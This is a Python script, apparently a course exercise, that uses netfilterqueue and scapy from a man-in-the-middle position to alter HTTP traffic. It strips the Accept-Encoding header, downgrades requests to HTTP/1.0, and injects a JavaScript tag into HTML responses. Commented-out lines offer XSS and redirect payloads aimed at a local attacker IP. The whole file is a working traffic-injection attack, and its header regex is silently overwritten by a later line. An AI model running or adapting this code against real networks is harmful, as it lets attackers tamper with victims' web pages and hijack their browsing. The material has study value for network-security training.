#!/usr/bin/env python
# iptables -I FORWARD -j NFQUEUE --queue-num 0
import netfilterqueue
import scapy.all as scapy
import re

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    # if scapy_packet.haslayer(scapy.Raw):
    if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 10000:
#            print(scapy_packet.show())
            # print(scapy_packet[scapy.Raw].load)
            hijacked_load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            # HTTP/1.1 segments packets, HTTP/1.0 does not, force HTTP/1.0 and all is good
            hijacked_load = load.replace("HTTP/1.1", "HTTP/1.0")
            hijacked_packet = set_load(scapy_packet, hijacked_load)
            packet.set_payload(str(hijacked_packet))
#            print(hijacked_packet.show())

        elif scapy_packet[scapy.TCP].sport == 10000:
            # poison_response = scapy_packet[scapy.Raw].load.replace("<script>alert('XSS')</script>")
            javascript = "<script>alert('Code Injection');</script></body>"
            poison_load = scapy_packet[scapy.Raw].load.replace("</body>", javascript)
            print("HTML found. Injecting code.")
            # poison_response = scapy_packet[scapy.Raw].load.replace("</BODY>", "<script>alert('XSS');</script></BODY>") 
            # poison_load = scapy_packet[scapy.Raw].load.replace("<html>", "<html><script>window.location.href='http://10.0.2.15'</script>")
            poison_packet = set_load(scapy_packet, poison_load)
            packet.set_payload(str(poison_packet))
            # print(scapy_packet.show())
            
            
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
